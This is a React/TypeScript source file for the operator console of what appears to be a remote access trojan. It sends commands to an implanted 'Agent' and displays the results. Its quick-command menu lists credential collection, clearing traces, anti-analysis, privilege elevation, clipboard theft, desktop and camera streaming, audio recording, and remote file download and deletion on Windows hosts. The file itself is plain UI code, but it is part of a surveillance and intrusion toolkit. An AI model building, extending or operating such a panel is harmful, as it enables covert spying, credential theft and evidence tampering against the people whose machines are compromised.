// 命令面板(真实对接 · 移植自 cleat-web CommandPanel): 任意 Agent 命令下发。
// 快捷命令分组 + 命令名/params JSON + push/pull 模式 + 响应展示 + 历史(点击回填)。
// 会话级 SSE/命令通道复用 cleat-api.sendCommand(含 310s 往返超时与命令层错误检查)。
import { useRef, useState } from 'react'
import { Clock, Play } from 'lucide-react'
import { toast } from 'sonner'
import { sendCommand, type CommandResponse } from '@/lib/cleat-api'
import { useCanWrite } from '@/hooks/use-can-write'
import { cn } from '@/lib/utils'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Textarea } from '@/components/ui/textarea'

interface QuickCmd {
  cmd: string
  label: string
  params?: Record<string, unknown>
}

const QUICK_GROUPS: { group: string; items: QuickCmd[] }[] = [
  {
    group: '系统',
    items: [
      { cmd: 'GetSystemInfo', label: '系统信息' },
      { cmd: 'Discovery', label: '域侦察' },
      { cmd: 'EnumProcess', label: '进程' },
      { cmd: 'EnumService', label: '服务' },
      { cmd: 'EnumDriver', label: '驱动' },
      { cmd: 'EnumWindow', label: '窗口' },
      { cmd: 'EnumNetwork', label: '网络' },
      { cmd: 'EnumSoftware', label: '软件' },
    ],
  },
  {
    group: '文件',
    items: [
      { cmd: 'FileListDir', label: '列目录', params: { path: 'C:\\' } },
      { cmd: 'FileGetDrives', label: '盘符' },
      { cmd: 'FileCreateDir', label: '建目录', params: { path: 'C:\\temp' } },
      { cmd: 'FileDelete', label: '删文件', params: { path: 'C:\\temp\\x.txt' } },
      { cmd: 'FileDownloadReq', label: '下载', params: { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts' } },
    ],
  },
  {
    group: '凭据/对抗',
    items: [
      { cmd: 'CredentialCollect', label: '凭据采集' },
      { cmd: 'ClearTraces', label: '清痕迹' },
      { cmd: 'AntiAnalysisScan', label: '反分析' },
      { cmd: 'Elevate', label: '提权' },
      { cmd: 'ClipboardGet', label: '剪贴板' },
    ],
  },
  {
    group: '控制',
    items: [
      { cmd: 'DesktopStreamStart', label: '桌面流开', params: { interval: 500 } },
      { cmd: 'DesktopStreamStop', label: '桌面流停' },
      { cmd: 'AudioStartRecord', label: '录音开' },
      { cmd: 'AudioStopRecord', label: '录音停' },
      { cmd: 'CameraStreamStart', label: '摄像头开', params: { interval: 1000 } },
      { cmd: 'CameraStreamStop', label: '摄像头停' },
      { cmd: 'ExitProgram', label: '退出' },
    ],
  },
]

interface HistItem {
  ts: string
  cmd: string
  ok: boolean
}

export function CommandPanel({ sessionId }: { sessionId: number }) {
  const canWrite = useCanWrite()
  const [cmd, setCmd] = useState('GetSystemInfo')
  const [paramsText, setParamsText] = useState('{}')
  const [mode, setMode] = useState<'push' | 'pull'>('push')
  const [sending, setSending] = useState(false)
  const [responseText, setResponseText] = useState('')
  const [elapsedMs, setElapsedMs] = useState(0)
  const [paramsError, setParamsError] = useState('')
  const [history, setHistory] = useState<HistItem[]>([])
  const responseRef = useRef<HTMLPreElement>(null)

  const applyQuick = (q: QuickCmd) => {
    setCmd(q.cmd)
    setParamsText(JSON.stringify(q.params || {}, null, 2))
    setParamsError('')
  }

  const parseParams = (): Record<string, unknown> | null => {
    try {
      const parsed = JSON.parse(paramsText || '{}')
      if (typeof parsed !== 'object' || parsed === null || Array.isArray(parsed)) {
        setParamsError('params 必须是 JSON 对象')
        return null
      }
      setParamsError('')
      return parsed
    } catch (e) {
      setParamsError(`JSON 解析失败: ${(e as Error).message}`)
      return null
    }
  }

  const pushHistory = (ok: boolean) => {
    setHistory((prev) =>
      [{ ts: new Date().toLocaleTimeString(), cmd: cmd.trim(), ok }, ...prev].slice(0, 50)
    )
  }

  const send = async () => {
    if (!canWrite) {
      toast.warning('当前角色无命令下发权限')
      return
    }
    if (!sessionId || sessionId <= 0) {
      toast.warning('请先选择会话')
      return
    }
    if (!cmd.trim()) {
      toast.warning('请输入命令名')
      return
    }
    const params = parseParams()
    if (!params) return

    setSending(true)
    setResponseText('')
    const t0 = performance.now()
    try {
      const resp: CommandResponse & { data?: unknown } = await sendCommand(sessionId, cmd.trim(), params, mode)
      setElapsedMs(Math.round(performance.now() - t0))
      setResponseText(JSON.stringify(resp, null, 2))
      pushHistory(true)
    } catch (e) {
      setElapsedMs(Math.round(performance.now() - t0))
      setResponseText(JSON.stringify({ error: (e as Error).message }, null, 2))
      pushHistory(false)
    } finally {
      setSending(false)
      // 响应区滚到顶部(JSON 起点比终点更有信息量; 大回执时用户自己滚)
      requestAnimationFrame(() => {
        if (responseRef.current) responseRef.current.scrollTop = 0
      })
    }
  }

  return (
    <div className='flex h-full min-h-0 flex-col gap-2 p-2'>
      {/* 快捷命令 */}
      <div className='flex flex-wrap gap-x-4 gap-y-1.5'>
        {QUICK_GROUPS.map((g) => (
          <div key={g.group} className='flex flex-wrap items-center gap-0.5'>
            <span className='me-1 text-xs whitespace-nowrap text-muted-foreground'>{g.group}</span>
            {g.items.map((item) => (
              <Button
                key={item.cmd + item.label}
                size='sm'
                variant='ghost'
                className='h-6 px-1.5 text-xs text-muted-foreground hover:text-foreground'
                onClick={() => applyQuick(item)}
              >
                {item.label}
              </Button>
            ))}
          </div>
        ))}
      </div>

      {/* 命令输入行 */}
      <div className='flex flex-wrap items-center gap-2'>
        <Input
          value={cmd}
          onChange={(e) => setCmd(e.target.value)}
          placeholder='命令名，如 GetSystemInfo'
          className='h-8 w-64 font-mono text-xs'
          onKeyDown={(e) => {
            if (e.key === 'Enter') void send()
          }}
        />
        <Select value={mode} onValueChange={(v) => setMode(v as 'push' | 'pull')}>
          <SelectTrigger className='h-8 w-32 text-xs'>
            <SelectValue />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value='push'>push (同步)</SelectItem>
            <SelectItem value='pull'>pull (异步)</SelectItem>
          </SelectContent>
        </Select>
        <Button
          size='sm'
          className='h-8 gap-1 text-xs'
          disabled={!canWrite || sending}
          title={!canWrite ? '当前角色无下发权限' : undefined}
          onClick={() => void send()}
        >
          <Play className='size-3.5' />
          {sending ? '发送中…' : '发送'}
        </Button>
      </div>

      {/* 参数 JSON */}
      <Textarea
        value={paramsText}
        onChange={(e) => {
          setParamsText(e.target.value)
          setParamsError('')
        }}
        rows={4}
        placeholder='参数 JSON，如 {"path": "C:\\"}'
        className='min-h-20 shrink-0 font-mono text-xs'
      />
      {paramsError && <p className='text-xs text-red-500'>{paramsError}</p>}

      {/* 历史(点击回填命令名) */}
      {history.length > 0 && (
        <div className='flex shrink-0 flex-wrap gap-1'>
          {history.map((h, i) => (
            <Badge
              key={i}
              variant='outline'
              title={h.ts}
              className={cn(
                'cursor-pointer font-mono text-[10px]',
                h.ok
                  ? 'border-sky-500/40 text-sky-600 hover:bg-sky-500/10 dark:text-sky-400'
                  : 'border-red-500/40 text-red-600 hover:bg-red-500/10 dark:text-red-400'
              )}
              onClick={() => setCmd(h.cmd)}
            >
              {h.cmd}
            </Badge>
          ))}
        </div>
      )}

      {/* 响应区 */}
      <div className='flex min-h-0 flex-1 flex-col gap-1'>
        <span className='flex shrink-0 items-center gap-1 text-xs text-muted-foreground'>
          响应
          {elapsedMs > 0 && (
            <>
              <Clock className='size-3' />
              {elapsedMs}ms
            </>
          )}
        </span>
        <pre
          ref={responseRef}
          className='m-0 min-h-0 flex-1 overflow-auto rounded-md border bg-muted/30 p-3 font-mono text-xs leading-relaxed break-all whitespace-pre-wrap'
        >
          {responseText || '等待命令…'}
        </pre>
      </div>
    </div>
  )
}
